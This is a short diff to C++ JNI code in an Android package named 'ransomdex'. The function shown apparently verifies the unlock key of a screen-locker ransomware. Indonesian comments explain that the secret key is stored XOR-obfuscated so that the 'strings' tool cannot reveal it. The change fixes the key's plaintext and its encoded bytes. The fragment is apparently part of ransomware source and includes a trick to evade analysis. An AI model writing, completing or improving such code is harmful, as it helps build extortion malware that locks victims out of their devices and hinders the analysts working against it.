@@ -81,10 +81,10 @@ Java_com_bondex_ransomdex_LockerService_verifyAdvancedKey(JNIEnv* env, jobject t
     const char* nativeInput = env->GetStringUTFChars(input, nullptr);
     std::string inputStr(nativeInput);
 
-    // Kunci Rahasia Obfuskasi: "dexamabjut4444" 
+    // Kunci Rahasia Obfuskasi: "dexambajut4444"
     // Disimpan dalam bentuk ter-XOR agar tidak muncul di command 'strings'
     unsigned char obfuscated_key[] = {
-        0x6A, 0x6B, 0x76, 0x6F, 0x63, 0x6F, 0x6C, 0x64, 0x7B, 0x7A, 0x3A, 0x3A, 0x3A, 0x3A
+        0x6A, 0x6B, 0x76, 0x6F, 0x63, 0x6C, 0x6F, 0x64, 0x7B, 0x7A, 0x3A, 0x3A, 0x3A, 0x3A
     };
     size_t key_len = 14;
 
